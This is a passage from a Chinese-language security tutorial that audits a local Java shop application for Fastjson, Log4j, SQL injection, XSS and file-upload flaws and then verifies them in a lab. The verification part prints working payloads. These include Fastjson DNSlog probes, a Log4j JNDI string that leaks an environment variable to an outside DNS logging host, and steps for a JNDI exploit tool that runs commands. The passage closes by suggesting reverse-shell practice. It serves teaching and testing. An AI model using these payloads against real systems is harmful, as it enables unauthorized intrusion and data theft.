alt="全局搜索parseObject"></p><p>双击进入<code>ProductController.java</code>文件，问题代码出现在了<code>第151行</code>，使用<code>JSON.parseObject()</code>方法反序列化了<code>propertyJson</code>参数，我们向上追踪<code>propertyJson</code>参数，该参数是<code>添加产品信息</code>接口中<code>产品属性JSON</code>字段。如下图所示：</p><p><img src="/img/propertyJson%E5%8F%82%E6%95%B0.jpg" alt="propertyJson参数"></p><p>通过代码审计，找到了Fastjson反序列化漏洞点。我们通过渗透测试进一步验证。</p><h3 id="2-2、Log4j漏洞代码审计"><a href="#2-2、Log4j漏洞代码审计" class="headerlink" title="2.2、Log4j漏洞代码审计"></a>2.2、Log4j漏洞代码审计</h3><p>本项目引入的Log4j版本为2.10.0，该版本存在远程代码执行漏洞。我们进一步探索一下。</p><h4 id="2-2-1、Log4j简述"><a href="#2-2-1、Log4j简述" class="headerlink" title="2.2.1、Log4j简述"></a>2.2.1、Log4j简述</h4><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p><h4 id="2-2-2、Log4j远程代码执行漏洞（CVE-2021-44228）简述"><a href="#2-2-2、Log4j远程代码执行漏洞（CVE-2021-44228）简述" class="headerlink" title="2.2.2、Log4j远程代码执行漏洞（CVE-2021-44228）简述"></a>2.2.2、Log4j远程代码执行漏洞（CVE-2021-44228）简述</h4><p>由于Apache Log4j2某些功能存在递归解析，攻击者可在未经身份验证的情况下构造发送带有攻击语句的数据请求包，最终造成在目标服务器上执行任意代码。</p><p>其中涉及到的lookup的主要功能就是提供另外一种方式以添加某些特殊的值到日志中，<strong>以最大化松散耦合地提供可配置属性供使用者以约定的格式进行调用。</strong></p><p>该组件漏洞主要发生在引入的<code>log4j-core</code>，<code>log4j-api</code>是不存在该问题的。<code>log4j-core</code>是源码，<code>log4j-api</code>是接口。</p><p><code>pom.xml</code>文件引入Log4j组件情况如下图所示，引入了<code>log4j-core</code>，以及版本为<code>2.10.0</code>。基本确定存在问题，验证还需进一步寻找能触发的漏洞点。</p><p><img src="/img/log4j%E5%BC%95%E5%85%A5.jpg" alt="log4j引入"></p><p>由于SprinBoot默认自带日志记录框架，一般不需要引入，在<code>pom.xml</code>中剔除出去。如下图所示：</p><p><img src="/img/%E5%89%94%E9%99%A4%E9%BB%98%E8%AE%A4%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95.jpg" alt="剔除默认日志记录"></p><h4 id="2-2-3、寻找漏洞触发点"><a href="#2-2-3、寻找漏洞触发点" class="headerlink" title="2.2.3、寻找漏洞触发点"></a>2.2.3、寻找漏洞触发点</h4><p>全局搜索关键字<code>logger</code>，如下图可以看出，本项目使用<code>logger.info</code>级别记录日志方式居多。</p><p><img src="/img/logger%E5%85%B3%E9%94%AE%E5%AD%97%E6%90%9C%E7%B4%A2.jpg" alt="logger关键字搜索"></p><p>大多漏洞分析文章使用<code>logger.error</code>去做调试。两者区别在于默认记录信息不同。这块内容留个作业，大家自行搜索下，不难理解。</p><p>经过一番探索，发现有几处日志记录拼接了变量参数，让我们看看这些参数是否是从前端传来的。如下图所示：</p><p><img src="/img/%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0loggerinfo.jpg" alt="头像上传loggerinfo"></p><p>双击即可进入该代码文件，该文件位于<code>src\main\java\com\xq\tmall\controller\admin\AccountController.java</code>。该代码文件位于Controller层，主要用于和视图交互，处理用户输入的数据等操作。</p><p>关键代码如下图所示：</p><p><img src="/img/logger%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81.jpg" alt="logger漏洞点关键代码"></p><p>对上述代码进行分析。触发漏洞点的代码为65行的<code>logger.info(&quot;获取图片原始文件名：&#123;&#125;&quot;, originalFileName);</code>。向上追踪，发现通过<code>file.getOriginalFilename();</code>获取file的文件名后赋值给<code>originalFileName</code>。在向上追踪，file参数来自<code>admin/uploadAdminHeadImage</code>接口，通过注释我们可以知道此处为<code>管理员头像上传</code>功能。</p><p>总结来说：访问管理员头像上传功能，将文件名改为攻击语句，即可触发Log4j漏洞。</p><p>关于该漏洞验证，需跳转到<code>四、渗透测试漏洞挖掘与验证</code>部分学习，从实战渗透测试角度进行攻击验证。</p><h3 id="2-3、Mybatis漏洞代码审计"><a href="#2-3、Mybatis漏洞代码审计" class="headerlink" title="2.3、Mybatis漏洞代码审计"></a>2.3、Mybatis漏洞代码审计</h3><p>本项目引入的Mybatis版本为3.5.1，该版本存在远程命令执行漏洞。我们进一步探索一下。</p><p>Mybatis &lt; 3.5.6存在远程代码执行漏洞，CVE编号为<code>CVE-2020-26945</code>。</p><p>在满足以下三个条件的时候，攻击者可以触发远程代码执行：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>、用户启用了内置的二级缓存（默认不开启，需手动配置）<br><br><span class="hljs-number">2</span>、用户未设置JEP-<span class="hljs-number">290</span>过滤器<br><br><span class="hljs-number">3</span>、攻击者找到了一种修改私有Map字段条目的方法，即修改org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.cache</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.PerpetualCache</span>.cache有效的缓存密钥<br></code></pre></td></tr></table></figure><p>所谓二级缓存，也就是将查询结果放到缓存中，下次查询时结果相同的话直接从缓存中获取结果。</p><p>经过探索<code>src\main\resources\mybatis</code>下面的配置文件，本项目并<code>未开启</code>二级缓存。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Mybatis开启二级缓存语句<br>&lt;setting name <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cacheEnabled&quot;</span> value <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>关键条件被否定，即不存在该漏洞，故忽略。</p><p>在审计到其他项目时，可以着重注意下版本号，以及开启二级缓存的语句。</p><p>关于该漏洞详情可以查阅下面地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mybatis/my</span>batis-<span class="hljs-number">3</span><span class="hljs-regexp">/pull/</span><span class="hljs-number">2079</span><br></code></pre></td></tr></table></figure><h3 id="3、单点漏洞审计"><a href="#3、单点漏洞审计" class="headerlink" title="3、单点漏洞审计"></a>3、单点漏洞审计</h3><p>对组件是否存在漏洞进行验证后，我们针对功能单点代码审计，发现存在的漏洞。</p><p>对于单点功能代码审计除了特定漏洞存在特定代码审计方法，一般我习惯先去看一遍Controller层代码，了解基本功能。再从功能出发进行代码审计。</p><h3 id="3-1、SQL注入漏洞代码审计"><a href="#3-1、SQL注入漏洞代码审计" class="headerlink" title="3.1、SQL注入漏洞代码审计"></a>3.1、SQL注入漏洞代码审计</h3><p>本项目使用了Mybatis，来定义SQL。我们主要查看Myabatis中<code>xxxMapper.xml</code>文件中是否存在使用<code>$</code>拼接SQL语句的情况。使用<code>$</code>是直接拼接SQL语句的，未进行转义。</p><p>全局搜索关键字<code>$</code>，确实存在几处<code>order by</code>使用了<code>$</code>拼接SQL语句，因为<code>order by</code>是没办法使用<code>#&#123;&#125;</code>的。搜索结果如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E6%90%9C%E7%B4%A2%E5%85%B3%E9%94%AE%E5%AD%97.jpg" alt="sql注入搜索关键字"></p><p>以<code>UserMapper.xml</code>文件为例，进行逆向追踪。</p><p>①、双击进入<code>UserMapper.xml</code>文件，第78行存在问题。向上查看根据<code>select id</code>追踪该dao层的代码文件。如果在IDEA中安装插件<code>Free Mybatis plugin</code>是可以快速进行跳转到代码文件，只需点击左侧绿色箭头即可，如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E8%B7%B3%E8%BD%AC.jpg" alt="sql注入快速跳转"></p><p>②、跳转到dao层代码文件，可以看到select函数中存在<code>orderUitl</code>参数，我们继续逆向追踪，看看参数值从何而来。</p><p><img src="/img/mapperjava%E6%96%87%E4%BB%B6.jpg" alt="mapperjava文件"></p><p>③、键盘按住<code>ctrl</code>键后鼠标左击<code>select</code>，查看谁使用该函数，如下图所示：</p><p><img src="/img/%E6%9F%A5%E7%9C%8Bselect%E4%BD%BF%E7%94%A8.jpg" alt="查看select使用"></p><p>④、可以看到有两个文件使用了该函数方法，点击<code>UserServiceImpl.java</code>文件，定位到37行。如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5impl%E5%B1%82.jpg" alt="sql注入impl层"></p><p>⑤、从上图可以看出。<code>getList</code>方法中需要<code>orderUtil</code>参数，我们继续逆向追踪，看看orderUtil又是从何而来。首先看看谁使用了<code>getList</code>方法，键盘按住<code>ctrl</code>键后鼠标左击<code>getList</code>，如下图所示：</p><p><img src="/img/getlist%E4%BD%BF%E7%94%A8.jpg" alt="getlist使用"></p><p>⑥、可以看到<code>UserController.java</code>使用了该方法，且第170行中传入了<code>orderUtil</code>值，进入文件查看具体代码，如下图所示：</p><p><img src="/img/UserController%E7%9A%84SQL%E6%B3%A8%E5%85%A5.jpg" alt="UserController的SQL注入"></p><p>⑦、针对上述文件进行分析，先看161行实例化OrderUitl工具类，该类需要两个参数即，<code>orderyBy和isDesc</code>。点击进入查看该类的代码，该类文件位于<code>src\main\java\com\xq\tmall\util\OrderUtil.java</code>。通过注释了解该类用于排序&#x2F;倒序字段。如下图所示：</p><p><img src="/img/orderUitl%E7%B1%BB.jpg" alt="orderUitl类"></p><p>⑧、此时应该追踪<code>orderBy</code>参数是从何而来。从下图可以看到，该值通过<code>admin/user/&#123;index&#125;/&#123;count&#125;</code>接口传过来的。通过注释可以看出来该接口用于按条件查询用户，如下图所示：</p><p><img src="/img/orderby%E5%AD%97%E6%AE%B5.jpg" alt="orderby字段"></p><p>整个流程串下来，确定了漏洞点为<code>orderby</code>参数，该参数值来源于<code>按条件查询用户</code>。</p><p>既然接口找到了，我们可以使用BurpSuite或者Postman来构造请求，然后进一步攻击验证。或者，通过注释我们了解到该接口为查询用户，我们访问后台寻找功能点，发现用户管理翻页查询会向该接口发送请求数据包，如下图所示：</p><p><img src="/img/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD.jpg" alt="用户管理功能"></p><p>点击翻页时，使用BurpSuite抓取数据包，可以看到发送数据包中存在orderby字段，如下图所示：</p><p><img src="/img/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%BF%BB%E9%A1%B5%E6%8A%93%E5%8C%85.jpg" alt="用户管理翻页抓包"></p><p>至此，SQL注入漏洞代码审计完毕。</p><p>确定了用户管理功能翻页查询数据处存在SQL注入。</p><p>关于SQL注入漏洞我们放在渗透测试部分进行实战验证。</p><h3 id="3-2、XSS漏洞代码审计"><a href="#3-2、XSS漏洞代码审计" class="headerlink" title="3.2、XSS漏洞代码审计"></a>3.2、XSS漏洞代码审计</h3><p>从开发视觉来看防护XSS漏洞，大多是过滤&#x2F;转义用户的输入和输出。对于开发人员来说，不可能对每一个输入和输出点进行过滤&#x2F;转义。一般常使用filter层（过滤器）或拦截器进行统一过滤。</p><p>或者所使用的前端框架自带防XSS机制。</p><p>所以，我们审计XSS漏洞第一步看看filter层是否存在XSS过滤代码。对本项目审计发现filter层并没有关于防护XSS的代码，如下图所示：</p><p><img src="/img/fillter%E5%B1%82.jpg" alt="fillter层"></p><p>第二步，我们看看使用的前端框架是什么，版本是多少，以及是否存在防XSS漏洞机制。经过一番查找，发现pom.xml和webapp文件下，都表明使用了传统的JSP。JSP大多配合Filter进行XSS防护，上述我们发现filter层并没有XSS防护机制。</p><p><img src="/img/pom%E5%BC%95%E5%85%A5jsp.jpg" alt="pom引入jsp"></p><p>经上述验证，本项目存在XSS漏洞。我们从渗透测试实战角度进一步验证。</p><h3 id="3-3、任意文件上传代码审计"><a href="#3-3、任意文件上传代码审计" class="headerlink" title="3.3、任意文件上传代码审计"></a>3.3、任意文件上传代码审计</h3><p>在做Log4j漏洞代码审计时，我们发现<code>管理员头像上传</code>存在文件上传功能，对于该功能，我们主要审计一下是否存在任意文件上传漏洞。</p><p>一般，对于代码审计任意文件上传漏洞来说，首先是看看是否存在文件上传功能，然后进一步审计是否存在任意文件上传漏洞。</p><p>或者我们可以查看Controller层所有代码，缕清项目大致有哪些功能点。</p><p>或者搜索相关关键字，文件上传关键字如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">File<br>FileUpload<br>FileUploadBase<br>FileItemIteratorImpl<br>FileItemStreamImpl<br>FileUtils<br>UploadHandleServlet<br>FileLoadServlet<br>FileOutputStream<br><span class="hljs-keyword">DiskFileItemFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartRequestEntity</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartFile</span><br><span class="hljs-keyword"></span>com.<span class="hljs-keyword">oreilly.servlet.MultipartRequest</span><br></code></pre></td></tr></table></figure><p>但对于<code>SpingBoot项目</code>来说，想要SpringBoot内嵌的Tomcat对JSP解析，一定要引入相关依赖。如下图所示：</p><p><img src="/img/JSP%E4%BE%9D%E8%B5%96.jpg" alt="JSP依赖"></p><p>对于很多SpringBoot项目来说，是无需引入解析JSP依赖的。那么对于任意文件上传漏洞来说，上传JSP木马肯定是没有办法解析的。对于任意文件上传漏洞利用，只能通过内存马等方式进行攻击了。后面会有相关项目练习。</p><p>这次，我们先关注本项目的<code>管理员头像上传</code>文件上传功能，进行代码审计。</p><p>已知本项目引入了对JSP解析的依赖，下面我们审计管理员头像上传功能的关键代码，看看能否上传JSP木马。代码如下图所示：</p><p><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81.jpg" alt="文件上传关键代码"></p><p><strong>代码审计分析：</strong></p><p>①、第62行，通过<code>@RequestMapping</code>注解，我们得到如下几个信息：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>.上传接口为admin/uploadAdminHeadImage（如果找不到前端页面，可以直接向该接口发送构造好的数据包）<br><span class="hljs-number">2</span>.上传方法为POST<br><span class="hljs-number">3</span>.produces = <span class="hljs-string">&quot;application/json;charset=UTF-8，定义了返回格式为JSON</span><br>关键信息为接口地址<br></code></pre></td></tr></table></figure><p>②、第63行，<code>uploadAdminHeadImage</code>方法接受绑定的<code>file参数</code>和<code>session参数</code>，我们主要关注<code>file</code>参数。</p><p>③、第64行，获取到文件名称后赋值给<code>originalFileName</code>。</p><p>④、第67行，是获取文件后缀名，先看括号内<code>originalFileName.lastIndexOf(&#39;.&#39;)</code>，获取<code>originalFileName</code>字符串最后一次出现<code>.</code>的地方。然后通过<code>substring</code>截取子串的方式得到文件后缀名，赋值给变量<code>extension</code>。也就是说，尽管出现<code>.jsp.jsp.jsp</code>这种形式后缀名，最后得到的结果也只有<code>.jsp</code>。</p><p>⑤、第69行，随机命名文件，采用<code>UUID+extension</code>方式，并赋值给<code>fileName</code>参数。</p><p>⑥、第71行，获取上传路径，赋值给<code>filePath</code>。</p><p>⑦、第76到80行，上传文件关键代码，创建文件流将文件上传到<code>filePath</code>路径中，上传成功后，会返回该文件的文件名。</p><p>至此，上传流程代码审计结束。整个流程串下来，我们发现并没有相关过滤恶意后缀名的代码。本项目中filter层也没有相关过滤代码。</p><p>经过分析确定该位置存在任意文件上传漏洞。</p><p>关于其他地方是否还存在任意文件上传漏洞呢？留个作业，大家练习一下。</p><p>关于任意文件上传漏洞验证，我们放在渗透测试实战部分进行验证。</p><h2 id="四、渗透测试漏洞挖掘与验证"><a href="#四、渗透测试漏洞挖掘与验证" class="headerlink" title="四、渗透测试漏洞挖掘与验证"></a>四、渗透测试漏洞挖掘与验证</h2><h3 id="2-1、登录处可暴力破解"><a href="#2-1、登录处可暴力破解" class="headerlink" title="2.1、登录处可暴力破解"></a>2.1、登录处可暴力破解</h3><p>前台用户登录处，管理后台登录处均没有图形验证码，以及其他防暴力破解措施。可以对账号进行爆破破解。</p><p>此处不过多展开，可以学习第一套课程文章。</p><h3 id="2-2、Fastjson漏洞验证"><a href="#2-2、Fastjson漏洞验证" class="headerlink" title="2.2、Fastjson漏洞验证"></a>2.2、Fastjson漏洞验证</h3><p>经过代码审计发现本项目存在FastJson漏洞。从漏洞触发点追踪到了用户输入点。下面我们从渗透测试阶段进行实战验证。</p><p>漏洞面为添加产品信息的<code>admin/product</code>接口，其中漏洞输入点为<code>propertyJson</code>参数。</p><p>定位代码位置，发现该代码位于<code>admin</code>路径下。根据代码结构，可以断定该功能在管理后台，如下图所示：</p><p><img src="/img/fastjson%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84.png" alt="fastjson代码路径"></p><p>访问管理后台，经过一番查找，发现漏洞输入点位于<code>所有产品-添加一件产品</code>功能下。</p><p>点击添加一件产品后，使用BurpSuite抓包拦截记录请求数据包，发现请求地址为<code>admin/product</code>，并且产品属性信息为<code>propertyJson</code>字段参数，如下图所示：</p><p><img src="/img/%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%BB%B6%E5%95%86%E5%93%81%E6%BC%8F%E6%B4%9E%E7%82%B9.png" alt="添加一件商品漏洞点"></p><p>将上面的数据包，发送到Repeater模块，用于后续漏洞验证。</p><p>对<code>propertyJson</code>参数值进行URL解码，发现为JSON格式字符串，如下图所示：</p><p><img src="/img/url%E8%A7%A3%E7%A0%81%E5%8F%82%E6%95%B0.png" alt="url解码参数"></p><h4 id="2-2-1、出网漏洞验证"><a href="#2-2-1、出网漏洞验证" class="headerlink" title="2.2.1、出网漏洞验证"></a>2.2.1、出网漏洞验证</h4><p>①、访问在线DNSlog地址，比如：<code>http://dnslog.cn/</code>，<code>https://log.咕.com/</code>。</p><p>②、点击获取一个子域名，如下图所示：</p><p><img src="/img/fastjson%E8%8E%B7%E5%8F%96dnslog.png" alt="fastjson获取dnslog"></p><p>③、下面，我们构造漏洞验证POC：<code>&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;4ssfle.dnslog.cn&quot;&#125;</code>，将其粘贴到<code>propertyJson</code>字段中。如下图所示：</p><p><img src="/img/fastjson%E6%BC%8F%E6%B4%9Epoc.png" alt="fastjson漏洞poc"></p><p>④、点击发送数据包后，稍等一小会，访问NDSLog地址，点击<code>Refresh Record</code>，可以看到获取到回显信息，成功触发了Fastjson漏洞，如下图所示：</p><p><img src="/img/fastjson-dnslog%E6%88%90%E5%8A%9F%E6%8E%A2%E6%B5%8B.png" alt="fastjson-dnslog成功探测"></p><p>至此，通过DNSLog方式，对Fastjson漏洞进行了验证，并证明该漏洞存在。</p><p>更多验证漏洞POC：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zeo&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<span class="hljs-string">&quot;&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-string">&quot;aaa&quot;</span>&#125;<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;]<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="2-3、Log4j漏洞验证"><a href="#2-3、Log4j漏洞验证" class="headerlink" title="2.3、Log4j漏洞验证"></a>2.3、Log4j漏洞验证</h3><p>从代码审计处分析发现Log4j存在漏洞，我们通过渗透测试进一步验证，并利用该漏洞。</p><p>首先，登录管理后台，访问<code>我的账户-管理员头像</code>。</p><p><img src="/img/%E7%AE%A1%E7%90%86%E5%91%98%E5%A4%B4%E5%83%8F%E5%A4%84.jpg" alt="管理员头像处"></p><p>然后，打开BurpSuite，浏览器配置还代理地址指向BurpSuite。点击管理员头像处，选择任意图片后，点击上传，此时BurpSuite拦截到上传数据包，如下图所示：</p><p><img src="/img/%E4%B8%8A%E4%BC%A0%E6%8A%93%E5%8C%85.jpg" alt="上传抓包"></p><p>最后，将数据包，发送到<code>Repeater模块</code>，以备后续验证使用。</p><h4 id="2-3-1、出网漏洞验证"><a href="#2-3-1、出网漏洞验证" class="headerlink" title="2.3.1、出网漏洞验证"></a>2.3.1、出网漏洞验证</h4><p>使用在线DNSlog，搭配POC进行漏洞验证。具体操作如下。</p><p>访问在线DNSlog地址，比如：<code>http://dnslog.cn/</code>，<code>https://log.咕.com/</code>。</p><p>①、访问上述任意DNSlog地址，点击<code>Get Subdomain</code>获取一个地址，如下图所示：</p><p><img src="/img/%E8%8E%B7%E5%8F%96dnslog%E5%9C%B0%E5%9D%80.jpg" alt="获取dnslog地址"></p><p>②、复制获取的地址，拼凑成漏洞验证POC：<code>$&#123;jndi:ldap://8xxxxx.dnslog.cn&#125;</code>，将其粘贴到上面数据包<code>filename</code>处，如下图所示：</p><p><img src="/img/%E7%B2%98%E8%B4%B4%E6%9E%84%E9%80%A0%E7%9A%84dnslog%E9%AA%8C%E8%AF%81%E8%AF%AD%E5%8F%A5.jpg" alt="粘贴构造的dnslog验证语句"></p><p>③、点击发送数据包后，访问DNSlog网站，点击<code>Refresh Record</code>，可以看到获取到了访问记录数据，如下图所示：</p><p><img src="/img/dnslog%E6%8E%A5%E5%8F%97%E6%8E%A2%E6%B5%8B.jpg" alt="dnslog接受探测"></p><h4 id="2-3-2、出网外带信息"><a href="#2-3-2、出网外带信息" class="headerlink" title="2.3.2、出网外带信息"></a>2.3.2、出网外带信息</h4><p>Log4j处理<code>$&#123;&#125;</code>是采用递归方式解析。也就是说有几个<code>$&#123;&#125;</code>表达式，就使用对应的Lookup解析几个。</p><p>因此，我们可以配合使用DNSLog来进行信息外带。具体操作如下。</p><p>①、打开DNSLog地址，点击获取一个子域名地址。</p><p>②、复制子域名地址，拼凑出攻击POC：<code>$&#123;jndi:ldap://$&#123;env:OS&#125;.8o4koq.dnslog.cn&#125;</code>，将其粘贴到上传头像数据包中的filename处，如下图所示：</p><p><img src="/img/%E5%A4%96%E5%B8%A6OS%E4%BF%A1%E6%81%AF.jpg" alt="外带OS信息"></p><p>④、点击发送数据包，观察DNSLog结果，得到外带信息结果，如下图所示：</p><p><img src="/img/%E5%A4%96%E5%B8%A6%E4%BF%A1%E6%81%AF%E7%BB%93%E6%9E%9C.png" alt="外带信息结果"></p><p>关于本漏洞可更多外带的信息，推荐学习下面这篇文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jas502n/</span>Log4j2-CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">44228</span><br></code></pre></td></tr></table></figure><h4 id="2-3-3、进一步利用JNDI注入工具探索"><a href="#2-3-3、进一步利用JNDI注入工具探索" class="headerlink" title="2.3.3、进一步利用JNDI注入工具探索"></a>2.3.3、进一步利用JNDI注入工具探索</h4><p>经过简单探测验证，发现头像上传功能的确存在Log4j的远程代码执行漏洞。一般验证到此也就结束了。但本着热爱学习态度，岂能不进一步研究一下呢。当然，下述行为<code>请勿进行未授权渗透测试等违法行为</code>，仅为了学习研究。</p><p>此步骤利用到的工具<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>同时打包放在了分享文件中。Java版本还是<code>1.8.0_261</code>。<strong>注意：</strong>要确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用。</p><p>①、打开命令行进入该工具目录，键入命令<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code>（<code>-C 远程class文件中要执行的命令。本例子为弹计算器</code>） ，该工具给出了可利用的攻击命令，如下图所示：</p><p><img src="/img/jdni%E5%B7%A5%E5%85%B7%E5%90%AF%E5%8A%A8.jpg" alt="jdni工具启动"></p><p>②、根据项目环境，我们选择使用第三个，<code>trustURLCodebase为false</code>，并且项目也是基于Tomcat8+，SpringBoot1.2.x+的。如果实在拿捏不准，大不了几个都试试。复制第三个攻击链接，将其粘贴到头像上传数据包中的filename处，如下图所示：</p><p><img src="/img/jndi%E5%B7%A5%E5%85%B7%E7%AC%AC%E4%B8%89%E4%B8%AA%E9%93%BE%E6%8E%A5.jpg" alt="jndi工具第三个链接"></p><p>③、点击发送数据包，稍等一会后，会发现本地弹出来了计算器，如下图所示：</p><p><img src="/img/jndi%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8.jpg" alt="jndi弹计算器"></p><p>至此，我们通过出网和不出网方式进行了验证，以及使用JNDI注入工具进行了<code>弹计算器</code>操作，当然对于JNDI注入工具的功能不仅仅如此。</p><p>后面关于Log4j漏洞反弹shell我会写个专项课程文章。</p><p>老规矩，针对这块留个作业，大家先行练习如何利用该工具进行反弹shell。</p><p>当然大家也可以将本项目打包成war包后，部署在Linux环境中进行练习。</p><h3 id="2-4、SQL注入漏洞验证"><a href="#2-4、SQL注入漏洞验证" class="headerlink" title="2.4、SQL注入漏洞验证"></a>2.4、SQL注入漏洞验证</h3><p>从代码审计处，我们发现了存在SQL注入的漏洞功能点<code>用户管理-点击下一页按钮</code>，会向后端发送查询数据包，其中存在漏洞参数<code>orderBy</code>。</p><p>现在，我们从渗透测试角度，对该漏洞进行验证。</p><p>首先，我们访问该功能，再点击下一页的时候，使用BurpSuite抓取数据包，如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%8C%85.jpg" alt="sql注入用户管理数据包"></p><p>用户管理处测试数据本身不多，无法点击下一页，大家可以自行构造上述数据包。</p><h4 id="2-4-1、初步判断"><a href="#2-4-1、初步判断" class="headerlink" title="2.4.1、初步判断"></a>2.4.1、初步判断</h4><p>使用orderBy子句，猜解列数。</p><p><code>orderBy=1</code>，返回正常数据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8088</span><span class="hljs-regexp">/tmall/</span>admin<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span>/<span class="hljs-number">10</span>?user_name=&amp;user_gender_array=&amp;orderBy=<span 